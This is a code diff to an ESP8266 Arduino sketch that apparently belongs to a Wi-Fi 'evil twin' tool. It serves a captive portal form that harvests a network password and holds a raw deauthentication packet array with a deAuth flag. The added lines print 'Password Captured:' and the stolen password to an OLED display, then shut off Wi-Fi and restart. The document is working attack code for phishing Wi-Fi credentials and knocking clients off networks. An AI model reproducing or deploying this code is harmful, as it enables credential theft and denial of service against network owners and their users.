@@ -10,7 +10,12 @@ extern "C" {
 #include "user_interface.h"
 }
 #endif
-
+//_________________________________________________________________
+SSD1306 display(0x3c, 4, 5); 
+bool deAuth = false;
+const int SHORT_PRESS_TIME = 500; 
+const int LONG_PRESS_TIME  = 2000;
+char ssid[20];
 //----------------------------------------------------------------
 // Captive Portal Prerequisites : -
 //----------------------------------------------------------------
@@ -25,7 +30,6 @@ const char MAIN_page[] PROGMEM = R"=====(
   <br>
   <input type="submit" value="Submit">
 </form> 
-
 </body>
 </html>
 )=====";
@@ -45,17 +49,19 @@ void handleForm() {
  String passwd = server.arg("passwd"); 
  Serial.print("Password:");
  Serial.println(passwd); 
+ display.clear();
+ display.setFont(ArialMT_Plain_10);
+ display.drawString(0, 0, "Password Captured:");
+ display.drawString(0, 20, passwd);
+ display.display();
+ WiFi.mode(WIFI_OFF);
+ delay(15000);
+ ESP.restart();
  //String s = "<a href='/'> Go Back </a>";
  //server.send(200, "text/html", s); //Send web page
 }
 
 //----------------------------------------------------------------
-SSD1306 display(0x3c, 4, 5); 
-bool deAuth = false;
-const int SHORT_PRESS_TIME = 500; 
-const int LONG_PRESS_TIME  = 2000;
-char ssid[20];
-//_________________________________________________________________
 uint8_t packet[26] = {
     0xC0, 0x00,
     0x00, 0x00,
